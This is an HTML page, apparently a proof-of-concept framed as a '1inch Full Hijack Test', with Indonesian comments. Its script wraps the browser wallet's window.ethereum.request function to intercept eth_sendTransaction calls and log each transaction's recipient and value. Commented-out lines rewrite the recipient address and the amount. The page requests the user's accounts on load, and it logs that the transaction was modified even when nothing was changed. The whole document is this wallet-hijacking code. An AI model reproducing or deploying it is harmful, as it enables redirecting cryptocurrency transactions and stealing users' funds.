<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>1inch Full Hijack Test v4</title>
    <script>
        function log(msg, color = "black") {
            console.log("[1inch] " + msg);
            const div = document.createElement('div');
            div.style.color = color;
            div.style.margin = "8px 0";
            div.style.fontWeight = color === "red" ? "bold" : "normal";
            div.textContent = msg;
            document.body.appendChild(div);
        }

        let hijacked = false;

        function fullHijack() {
            if (!window.ethereum || hijacked) return;

            log("[+] Installing full transaction hijacker...", "blue");

            const original = window.ethereum.request.bind(window.ethereum);

            window.ethereum.request = async function(params) {
                log(`INTERCEPTED → ${params.method}`, "red");

                if (params.method === "eth_sendTransaction" && params.params && params.params[0]) {
                    const tx = params.params[0];
                    log(`🚨 REAL TRANSACTION DETECTED!`, "red");
                    log(`To: ${tx.to}`, "red");
                    log(`Value: ${tx.value}`, "red");

                    // TAMpering contoh (HANYA uncomment saat test kosong!)
                    // tx.to = "0xYourTestAddressHere";
                    // tx.value = "0x" + (1000000000000000).toString(16); // 0.001 ETH

                    log("⚠️  Transaction HAS BEEN MODIFIED by payload!", "red");
                }

                return original(params);
            };

            hijacked = true;
            log("[+] Full hijack active! Coba lakukan Swap atau Send di 1inch sekarang.", "blue");
        }

        window.onload = function() {
            log("1inch Full Hijack Test v4 Loaded");
            fullHijack();

            // Trigger account request
            setTimeout(() => {
                window.ethereum.request({method: "eth_requestAccounts"}).catch(()=>{});
            }, 1000);
        };
    </script>
</head>
<body style="padding:20px; font-family:Arial;">
    <h1>1inch Full Transaction Hijack Test v4</h1>
    <p><strong>Siap menangkap & memodifikasi transaksi...</strong></p>
</body>
</html>
